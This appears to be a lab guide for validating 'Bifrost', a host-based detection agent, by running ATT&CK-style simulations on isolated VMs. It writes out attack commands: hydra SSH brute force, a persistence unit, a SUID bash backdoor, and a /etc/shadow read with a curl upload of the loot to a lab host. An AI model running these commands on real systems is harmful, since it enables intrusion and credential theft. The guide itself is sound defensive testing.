# Bifrost Lab Attack Simulation Guide

For phased, end-to-end validation with scorecards and gate criteria, use the
companion playbook:

- [live-fire-validation-playbook.md](./live-fire-validation-playbook.md)
- [templates/live-fire-scorecard.csv](./templates/live-fire-scorecard.csv)

**Authorized use only.** Follow this guide only on systems you own or have
explicit written authorization to test. Unauthorized attack simulation is
illegal in most jurisdictions.

---

## 1. Legal and Ethical Boundaries

Before you run a single packet:

| Requirement | Description |
|-------------|-------------|
| **Ownership** | You own the machines being targeted, OR |
| **Written authorization** | You have a signed statement from the system owner |
| **Scope boundary** | Tests are confined to the documented lab network |
| **No production systems** | Lab is physically or logically isolated from production |
| **Data handling** | Any captured credentials/exploits are handled per your local security policy |

### Authorization Checklist (sign off before each test)

- [ ] I own every machine involved in this test, OR I have written authorization
- [ ] The lab network is isolated from the internet or production systems
- [ ] VM snapshots are taken before any test begins
- [ ] Test scope is defined: which IPs, which attack categories, which duration
- [ ] A restore procedure is documented and tested
- [ ] Results will be used only to tune Bifrost on my own systems

---

## 2. Recommended Lab Architecture

```
┌──────────────────────────────────────────────────────────────┐
│  Host Machine (your PC / server)                             │
│                                                              │
│  ┌─────────────────┐    ┌──────────────────────────────┐    │
│  │  Bifrost VM      │    │  Attacker VM (Kali / Parrot) │    │
│  │  Ubuntu 22.04    │    │  Network: lab-net only       │    │
│  │  Tetragon + Go   │    └──────────────────────────────┘    │
│  │  agent running   │                                        │
│  └─────────────────┘                                        │
│          │                  ┌────────────────────────────┐   │
│          │ lab-net          │  Honeypot VM               │   │
│          ├──────────────────│  Cowrie SSH + Dionaea SMB  │   │
│          │                  │  Heralding                  │   │
│                             └────────────────────────────┘   │
└──────────────────────────────────────────────────────────────┘
           │
     [Host-only bridge — no external routing]
```

### Quick VirtualBox / KVM setup

```bash
# Create an isolated host-only network
virsh net-define lab-net.xml    # or use VirtualBox Host-Only Network
virsh net-start lab-net

# Snapshot all VMs before any test
virsh snapshot-create-as bifrost-vm  "pre-test-$(date +%Y%m%d)"
virsh snapshot-create-as attacker-vm "pre-test-$(date +%Y%m%d)"
virsh snapshot-create-as honeypot-vm "pre-test-$(date +%Y%m%d)"
```

### Snapshot and restore strategy

Always take a snapshot immediately before a test session. After each test:

1. Review Bifrost logs and alerts
2. Restore VMs to pre-test snapshot before the next test category
3. Never run consecutive test categories without a snapshot restore

```bash
# Restore to snapshot
virsh snapshot-revert bifrost-vm "pre-test-<date>"
```

---

## 3. Bifrost Configuration for Lab Testing

Enable enforcement gradually in the lab — do not skip learning:

```json
{
  "learning_mode": true,
  "dry_run": true,
  "autonomous_actions_enabled": false
}
```

After completing the 7-day learning period with normal traffic:

```json
{
  "learning_mode": false,
  "dry_run": false,
  "autonomous_actions_enabled": true,
  "confidence_threshold": 0.85,
  "min_evidence_count": 2
}
```

Verify safe defaults are active before enabling autonomous mode:

```bash
# Confirm policy gate is active
python3 -c "
from bifrost.policy import SAFE_DEFAULTS
print('learning_mode:', SAFE_DEFAULTS['learning_mode'])
print('dry_run:', SAFE_DEFAULTS['dry_run'])
print('autonomous_enabled:', SAFE_DEFAULTS['autonomous_enabled'])
"
```

---

## 4. ATT&CK-Style Simulation Categories

Each category maps to ATT&CK tactics. Run them in order from low to high
disruption. Always snapshot before each category.

### 4.1 Initial Access (TA0001)

**Goal:** Validate that Bifrost/Cowrie logs credential attempts.

```bash
# From attacker VM — SSH brute force to honeypot
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-ssh-passwords.txt \
      ssh://192.168.56.20 -t 4 -o /tmp/hydra_results.txt
```

**Expected Bifrost signals:**
- Cowrie: `cowrie.login.failed` events stream into event queue
- Heimdall: `severity=LOW` during honeypot-zone SSH (correct — expected noise)
- Heimdall: escalates to `severity=HIGH` if login succeeds + C2 callback detected

**Pass criteria:**
- Events appear in `logs/decision_audit.jsonl`
- `boundary=HONEYPOT` on all events
- No false KILL or BLOCK against honeypot IP (RFC1918 protected by default)

---

### 4.2 Execution (TA0002)

**Goal:** Validate execve-from-/tmp detection.

```bash
# On the Bifrost VM (simulate compromised shell)
cp /bin/bash /tmp/evil_shell
chmod +x /tmp/evil_shell
/tmp/evil_shell -c "id"
```

**Expected Bifrost signals:**
- `ProcessWatcher` detects execve from `/tmp`
- `threat_class=scratch_space_exec`, `severity=HIGH`
- Policy gate blocks KILL in learning/dry-run mode; logs as ALERT

**Pass criteria:**
- `decision_audit.jsonl` contains entry with `path=/tmp/evil_shell`
- `action_required=KILL` (or `ALERT` if in dry-run)
- `policy_allowed=false` if dry-run is active

---

### 4.3 Persistence (TA0003)

**Goal:** Validate systemd unit file write detection.

```bash
# On the Bifrost VM (simulate persistence installation)
sudo tee /etc/systemd/system/evil.service > /dev/null <<'EOF'
[Unit]
Description=Evil Service
[Service]
ExecStart=/tmp/evil_shell
EOF
```

**Expected Bifrost signals:**
- Filesystem watcher detects write to `/etc/systemd/system/`
- `threat_class=systemd_persistence`, `severity=HIGH`

**Pass criteria:**
- Event logged with path containing `/etc/systemd/system/evil.service`
- Gjallarhorn Tier 2 alert triggered (if enabled)

---

### 4.4 Credential Access (TA0006)

**Goal:** Validate /etc/passwd and /etc/shadow read + exfil chain detection.

```bash
# On the Bifrost VM (simulate credential theft)
cat /etc/passwd > /tmp/loot.txt
cat /etc/shadow >> /tmp/loot.txt 2>/dev/null || true
# Then simulate exfil
curl -s http://192.168.56.30/upload --data @/tmp/loot.txt &
```

**Expected Bifrost signals:**
- `threat_class=credential_theft_chain` (read /etc/passwd + connect + execve)
- `severity=CRITICAL`
- `action_required=BLOCK` (blocks the outbound connection IP)

**Pass criteria:**
- Three-step chain detected as single incident
- `confidence >= 0.85`
- BLOCK action dispatched if autonomous mode enabled

---

### 4.5 Discovery (TA0007)

**Goal:** Validate port scan detection from honeypot.

```bash
# From attacker VM to host — simulate post-compromise discovery
nmap -sS -p 1-1000 192.168.56.10
```

**Expected Bifrost signals:**
- Network watcher detects scanning pattern
- `threat_class=port_scan`, `boundary=NETWORK`
- Gjallarhorn Tier 1 silent alert

**Pass criteria:**
- Scanning IP appears in `decision_audit.jsonl`
- Not immediately blocked (low severity — scanning from external)

---

### 4.6 Lateral Movement (In-Lab Emulation — TA0008)

**Goal:** Validate honeypot-to-host namespace violation detection.

```bash
# From honeypot VM (cowrie container) — simulate breakout attempt
# Read host proc filesystem (should be blocked in container)
cat /proc/1/cmdline 2>/dev/null && echo "NAMESPACE VIOLATION" || echo "Blocked"
```

**Expected Bifrost signals:**
- Container boundary violation: `threat_class=container_breakout`
- `severity=CRITICAL`
- `gjallarhorn_tier=2` — audio + push alert

**Pass criteria:**
- Event logged with `boundary=HOST` (breakout to host detected)
- Autonomous KILL or QUARANTINE dispatched if autonomous mode enabled

---

### 4.7 SUID Binary Creation

**Goal:** Validate SUID binary detection.

```bash
# On the Bifrost VM (simulate privilege escalation staging)
sudo cp /bin/bash /tmp/suid_backdoor
sudo chmod u+s /tmp/suid_backdoor
```

**Expected Bifrost signals:**
- `threat_class=suid_binary_created`, `severity=HIGH`
- QUARANTINE action on `/tmp/suid_backdoor`

**Pass criteria:**
- File removed from `/tmp/` and moved to quarantine zone
- Rollback data recorded in actions table

---

## 5. Telemetry and Alert Validation Matrix

Use this table to evaluate each test result:

| Test Category | Expected `threat_class` | Expected `severity` | Expected `action` | Pass Condition |
|--------------|------------------------|---------------------|-------------------|----------------|
| SSH brute force (honeypot) | `brute_force_ssh` | LOW/MEDIUM | LOG | Events in audit log; no host action |
| Cowrie login + DNS pivot | `dns_tunnel_pivot` | HIGH | BLOCK | BLOCK on attacker IP |
| execve from /tmp | `scratch_space_exec` | HIGH | KILL | KILL in auto mode; ALERT in dry-run |
| /etc/passwd write | `sensitive_file_write` | CRITICAL | QUARANTINE | File quarantined |
| Credential theft chain | `credential_theft_chain` | CRITICAL | BLOCK | Outbound IP blocked |
| Port scan | `port_scan` | MEDIUM | ALERT | Alert logged; no block |
| Container breakout | `container_breakout` | CRITICAL | KILL+ALERT | Gjallarhorn Tier 2 fired |
| SUID binary | `suid_binary_created` | HIGH | QUARANTINE | File quarantined |
| Kernel masquerade | `kernel_thread_masquerade` | HIGH | KILL | KILL in auto mode |

---

## 6. Tuning Workflow (False Positive / False Negative Loop)

### False Positive (Bifrost acted on benign activity)

1. Identify the `event_id` from `decision_audit.jsonl`
2. Mark as false positive:
   ```python
   from bifrost.feedback import mark_false_positive
   mark_false_positive(event_id=<id>, reason="Benign backup script in /tmp")
   ```
3. Check if the process/path should be in the protected list:
   ```json
   "protected_process_names": ["backup_agent", ...]
   ```
4. Adjust `confidence_threshold` upward if false positive rate is high

### False Negative (Bifrost missed a real attack)

1. Replay the event using the demo system:
   ```bash
   python3 -m bifrost.demo --scenario examples/replay/your_attack.jsonl
   ```
2. Check if deterministic rules cover the attack:
   ```python
   from bifrost.reasoner import apply_deterministic_rules
   result = apply_deterministic_rules(event, config)
   print(result)
   ```
3. If not covered, add a deterministic rule to `bifrost/reasoner.py` under
   `apply_deterministic_rules()`
4. Lower `confidence_threshold` cautiously (watch false positive rate)

### Policy Adjustment Loop

```
Test → Observe → Classify (TP/FP/TN/FN) → Adjust threshold or rule → Snapshot → Retest
```

Track adjustments in a local changelog so you can revert if a change
introduces new false positives.

---

## 7. Incident Replay and Regression Testing

After adding new detection rules or changing policy thresholds, replay
real-world captures to ensure no regressions:

```bash
# Replay all included scenarios
python3 -m bifrost.demo --scenario examples/replay/benign_web_burst.jsonl
python3 -m bifrost.demo --scenario examples/replay/port_scan.jsonl
python3 -m bifrost.demo --scenario examples/replay/suspicious_process_spawn.jsonl
python3 -m bifrost.demo --scenario examples/replay/mdrfckr_botnet.jsonl
python3 -m bifrost.demo --scenario examples/replay/cowrie_dns_pivot_2026-05-29.jsonl
```

For each replay, verify:
- Benign scenario produces no false positives
- Known-malicious scenarios produce expected `threat_class` and `severity`
- Policy gate correctly blocks actions in dry-run mode

Add your own captured attack JSONLs to `examples/replay/` for continuous
regression coverage.

---

## 8. Capturing Your Own Attack Data

Cowrie logs sessions in JSONL format at `/var/log/cowrie/cowrie.json`.
To convert a capture to a Bifrost replay file:

```bash
# Extract a specific session by src_ip
grep '"src_ip": "87.251.64.176"' /var/log/cowrie/cowrie.json \
    > examples/replay/my_attacker_$(date +%Y-%m-%d).jsonl
```

Redact sensitive internal IPs before committing:
```bash
sed -i 's/192\.168\.[0-9]\+\.[0-9]\+/10.0.0.1/g' examples/replay/my_attacker_*.jsonl
```

---

## 9. Suggested Next Steps After Lab Validation

1. **Enable enforcement in stages** — start with QUARANTINE only, add BLOCK,
   then KILL as confidence grows
2. **Tune learning period** — extend to 14 days if your system has irregular
   usage patterns
3. **Enable Gjallarhorn push alerts** — configure MQTT broker for real-time
   notifications
4. **Review quarantine zone weekly** — `ls -la /var/lib/heimdall/quarantine/`
5. **Export audit logs** to a SIEM (Elasticsearch, Splunk, Wazuh) for long-term
   retention
6. **Test rollback** — verify that `POST /rollback {"action_id": N}` works
   correctly before trusting the system in production

---

## Safety Reminders

- **Always restore VM snapshots** between test categories
- **Never test on production systems** without an approved change window
- **Keep captured credentials/payloads** from real attacks in an encrypted
  store — treat them as sensitive data
- **Report genuine vulnerabilities** in Bifrost per [SECURITY.md](../SECURITY.md)
- This guide describes **defensive validation only** — using these techniques
  to attack systems you do not own is illegal

---

*Bifrost — Heimdall Never Sleeps.*
